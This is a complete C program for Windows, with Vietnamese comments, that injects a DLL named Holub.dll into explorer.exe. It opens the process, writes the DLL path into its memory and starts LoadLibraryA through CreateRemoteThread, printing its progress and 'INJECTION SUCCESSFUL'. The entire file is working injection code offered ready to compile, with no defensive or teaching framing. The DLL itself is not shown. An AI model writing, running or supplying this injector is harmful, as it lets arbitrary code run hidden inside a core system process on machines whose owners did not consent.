#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindProcessId(const wchar_t* processName)
{
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe))
    {
        do
        {
            if (_wcsicmp(pe.szExeFile, processName) == 0)
            {
                processId = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return processId;
}

int main()
{
    printf("========== DLL INJECTOR ==========\n\n");

    // Tìm Explorer
    printf("[*] Looking for Explorer...\n");
    DWORD pid = FindProcessId(L"explorer.exe");

    if (pid == 0)
    { 
        printf("[!] Explorer not found!\n");
        return 1;
    }

    printf("[+] Found Explorer PID: %d\n", pid);

    // Đường dẫn DLL (cùng thư mục với injector)
    char dllPath[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, dllPath);
    strcat(dllPath, "\\Holub.dll");
    printf("[*] DLL Path: %s\n", dllPath);

    // Mở process
    printf("[*] Opening process...\n");
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);

    if (!hProcess)
    {
        printf("[!] OpenProcess failed. Error: %d\n", GetLastError());
        printf("[*] Try running as Administrator!\n");
        return 1;
    }
    printf("[+] Process opened\n");

    // Cấp phát bộ nhớ
    printf("[*] Allocating memory...\n");
    size_t dllPathSize = strlen(dllPath) + 1;
    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, dllPathSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pRemoteMemory)
    {
        printf("[!] VirtualAllocEx failed. Error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Memory allocated at 0x%p\n", pRemoteMemory);

    // Ghi DLL path
    printf("[*] Writing DLL path...\n");
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath, dllPathSize, NULL))
    {
        printf("[!] WriteProcessMemory failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] DLL path written\n");

    // Lấy địa chỉ LoadLibraryA
    printf("[*] Getting LoadLibraryA address...\n");
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    printf("[+] LoadLibraryA at 0x%p\n", pLoadLibrary);

    // Tạo remote thread
    printf("[*] Creating remote thread...\n");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, NULL);

    if (!hThread)
    {
        printf("[!] CreateRemoteThread failed. Error: %d\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    printf("[+] Remote thread created!\n");

    // Đợi thread
    printf("[*] Waiting for thread to finish...\n");
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] Thread finished\n");

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("\n[+] ===== INJECTION SUCCESSFUL! =====\n");
    printf("[*] Holub.dll loaded into Explorer (PID: %d)\n", pid);

    return 0;
}
